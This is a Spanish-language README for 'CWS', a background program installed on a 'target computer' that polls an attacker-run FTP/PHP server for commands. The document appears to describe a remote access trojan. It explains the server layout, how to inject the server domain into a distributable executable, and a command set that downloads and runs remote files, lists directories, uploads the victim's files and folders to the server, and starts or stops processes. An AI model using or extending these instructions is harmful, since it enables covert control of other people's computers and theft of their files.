# CWS
A software waiting for commands. Like [Borocito](https://github.com/Zhenboro/Borocito)

## Creando el Servidor
CWS necesita de un servidor FTP para poder funcionar.
`CWS.exe` (desde ahora `CWScli`) es el ejecutable que se estará en segundo plano en el computador objetivo.
Una vez allí, `CWScli` comenzará su trabajo, pero antes es necesario poner el servidor en marcha.

Es muy fácil hacer que todo funcione.

### Estructura obligatoria
`CWScli` tiene una estructura predefinida en su código, solo falta que tú copies esta estructura en tu servidor.  
Con estructura me refiero a que los archivos, rutas y carpetas deben estar de cierta forma dentro de tu servidor.  

1. En un directorio principal. Deberás crear las siguientes carpetas:  
	- `CWS`  
	- Dentro de la carpeta `CWS` deberás crear una carpeta llamada `Users`.  
3. Dentro de la carpeta `CWS`. Deberás poner los siguientes archivos:  
	- `ReportIt.php`  
	- `cliResponse.php`  
	- `fileUpload.php`  
	- Opcionalmente, puedes poner `createFolder.php`. Aunque este no se utiliza.  

También deberás editar el archivo `General.ini`
Dentro de este deberás poner ciertos valores:
Las líneas con "`[]`" no las puedes editar.
Campos:
- `IsEnabled=True`: True/False. Si `CWScli` está disponible para funcionar. De estar en `false` todos los `CWScli` dejarán de funcionar.  
- `IsReading=True`: True/False. Si `CWScli` debe hacer caso a este archivo. De estar en `false` todos los `CWScli` dejarán de funcionar.  
- `Name=CWS`: Nombre del programa. En este caso se llama CWS. No editar ni modificar.  
- `Version=1.1.0.0`: Versión actual de CWS. Sí se publica una nueva release, deberás subir un .zip con la nueva versión de CWS.exe al servidor. Luego deberás editar este campo con la versión correspondiente.  
- `Download=null`: Link de descarga directo del .zip con el CWS.exe. Si hay una nueva versión, es esto lo que `CWScli` descargara para luego instalar.  
- `HostDomain=null`: Dominio. Es el link del servidor al que responde. Pone aquí tu el link a tu servidor.  
- `GeneralConfigFileReaderTimeout=60000`: Número. Cada cuanto tiempo se leerá este archivo.  
- `PrivateConfigFileReaderTimeout=60000`: Número. Cada cuanto tiempo verá por modificaciones en el archivo de control por usuario. (En resumen: cada cuanto tiempo verá por nuevos comandos).   

Luego de editarlo, súbelo al servidor dentro de la carpeta CWS.  

 4. Listo. El Servidor ya está configurado.  
		Un ejemplo del cómo debería quedar es:  
			Ejemplo:  
				Siendo HostDomain=http://mi-dominio.com  
				http://mi-dominio.com/CWS  
				http://mi-dominio.com/CWS/Users  
				http://mi-dominio.com/CWS/ReportIt.php  
				http://mi-dominio.com/CWS/cliResponse.php  
				http://mi-dominio.com/CWS/fileUpload.php  
				http://mi-dominio.com/CWS/General.ini  

## Inyectando tu Servidor
`CWScli` no funcionará si no sabe a qué servidor servir. Debes inyectar el link de tu servidor dentro de CWS.exe para que este funcione.  
La inyección debe hacerse con CWS Control.exe  

1. Dentro de CWS Contro.exe debes dirigirte a la pestaña "Injector".
2. En el campo "Ruta ejecutable" lo dejas en blanco xD.  
3. En el campo "HostDomain" debes poner tu servidor. Ejemplo: http://mi-dominio.com <- tal cual. "http://mi-dominio.com/" no sirve. Debe ser sin el / final.  
4. Una vez completado eso. Clic en el botón "INYECTAR" y te pedira que selecciones CWS.exe para poder escribir dentro de él el HostDomain.  
5. Listo. Un mensaje aparecerá confirmando la acción. El nuevo CWS.exe generado es el que se puede distribuir.  

## Controlando
Todos los computadores que tengan CWS.exe ejecutándose podrán ser controlados.  
Basta con ver la lista de comandos:  
- `/Network.DownloadComponent=<url>, <fileName>, <isCompressed>, <RunLater>, <mainFileName>, <Parameter>`  
	- `url`: link de descarga directo de algún complemento. (a un ejecutable, un comprimido, imagen o archivo de texto, etc).  
	- `fileName`: El nombre que recibirá el archivo descargado dentro del computador. (si la url conduce a descargar `hola.zip` tendrás que poner ese nombre junto a su extensión (`hola.zip`)).  
	- `isCompressed: True/False`. Si el archivo que se descargó es un .zip, entonces deberás poner `True`. Si es otro tipo de archivo (ejemplo: una imagen, archivo de texto, ejecutable, etc) entonces pone `False`.  
	- `mainFileName`: Es el nombre del archivo principal. Si él .zip contiene un archivo llamado `Hola.exe`, entonces pone aquí `Hola.exe`. Así `CWScli` sabrá que archivo debe ejecutar en caso de que `RunLater` este en `True`.  
	- `RunLater: True/False`. Si quieres que el archivo descargado se inicie debes poner `True`, si no quieres que se inicie, pone `False`.
	No es necesario que sea un .exe.
	Realmente si pones `True`, cualquier archivo iniciará.
	Sea una imagen (comenzara con la aplicación Fotos) o un archivo de texto (comenzara con Bloc de notas) y así.  
	- Parameters: Si es un ejecutable podrás poner parámetros para que este arranque. Si no es un ejecutable, entonces pon `null`.  
- `/FileSystem.GetFiles=<ruta_directorio>`  
	- `ruta_directorio`: La ruta a la cual se listaran todos los archivos. Ejemplo: `C:\Users\Zhenboro\Desktop`.  
	Eso devolverá todas las rutas de los archivos dentro de esta.  
- `/FileSystem.GetDirectories=<ruta_directorio>`  
	- `ruta_directorio`: La ruta a la cual se listaran todas las carpetas.  
	Ejemplo: `C:\Program Files`.  
	Eso devolverá todas las rutas de las carpetas dentro de esta.  
- /Network.GetFile=<ruta_archivo>  
	- `ruta_archivo`: Ruta del archivo que quieres se suba al servidor.  
	Ejemplo: `C:\Users\Zhenboro\Desktop\Registros.docx` este archivo Registros.docx se subirá al servidor y lo podrás ver.  
	**(Cuidado: Si el archivo es muy grande, podría dañarse mientras se sube. También ten en cuenta que algunos servicios de hosting no permiten subidas de ciertos tipos de archivo)**
- `/Network.GetFolder=<ruta_directorio>`  
	- `ruta_directorio`: Ruta del directorio que quieres se suba al servidor.  
	Ejemplo: `C:\Users\Zhenboro\Desktop` todos los archivos y carpetas dentro de la carpeta `Desktop` serán comprimidos en un .zip y luego este se subirá al servidor.  
	**(Cuidado: Si el hay muchos archivos, él .zip podría no subirse. También ten en cuenta que algunos servicios de host no permiten la subida de archivos .zip)**
- `/Process.Start=<ruta_archivo>, <Parameter>`  
	- `ruta_archivo`: Indica la ruta del archivo que quieres iniciar. Puede ser un archivo de texto, imagen, etc.  
	Ejemplo: `C:\Users\Zhenboro\Desktop\programa.exe` o `winword.exe` (sin indicar la ruta, Microsoft Word puede ser arrancado sin indicar la ruta, también pasa con, por ejemplo, cmd.exe, firefox.exe, etc...).  
	Incluso mostrar una página web (msedge.exe,http://midominio.com)  
	- `Parameter`: Sí es un ejecutable, podrás pasar parámetros. Si no, déjalo vacío.  
- `/Process.Stop=<nombre_proceso>`  
	- `nombre_proceso`: Nombre del programa a cerrar. Ejemplo: `winword` (sin extensión)  
- /Stop  
Detiene la instancia de CWS.exe  
